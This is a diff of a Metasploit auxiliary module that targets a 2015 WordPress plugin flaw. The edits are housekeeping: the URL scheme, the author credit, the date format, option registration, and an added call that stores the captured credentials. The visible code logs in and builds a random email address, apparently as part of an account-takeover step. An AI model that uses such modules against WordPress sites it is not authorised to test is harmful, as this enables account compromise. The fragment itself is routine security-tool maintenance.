@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
@@ -26,22 +24,22 @@ class MetasploitModule < Msf::Auxiliary
       },
       'Author'          =>
         [
-          'Evex',                             # Vulnerability discovery
-          'Rob Carr <rob[at]rastating.com>'   # Metasploit module
+          'Evex',     # Vulnerability discovery
+          'rastating' # Metasploit module
         ],
       'License'         => MSF_LICENSE,
       'References'      =>
         [
           ['WPVDB', '7785']
         ],
-      'DisclosureDate'  => 'Feb 09 2015'
+      'DisclosureDate'  => '2015-02-09'
       ))
 
     register_options(
       [
         OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
         OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
-      ], self.class)
+      ])
   end
 
   def check
@@ -100,6 +98,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Authenticating with WordPress using #{username}:#{password}...")
     cookie = wordpress_login(username, password)
     fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?
+    store_valid_credential(user: username, private: password, proof: cookie)
     print_good("Authenticated with WordPress")
 
     new_email = "#{Rex::Text.rand_text_alpha(5)}@#{Rex::Text.rand_text_alpha(5)}.com"
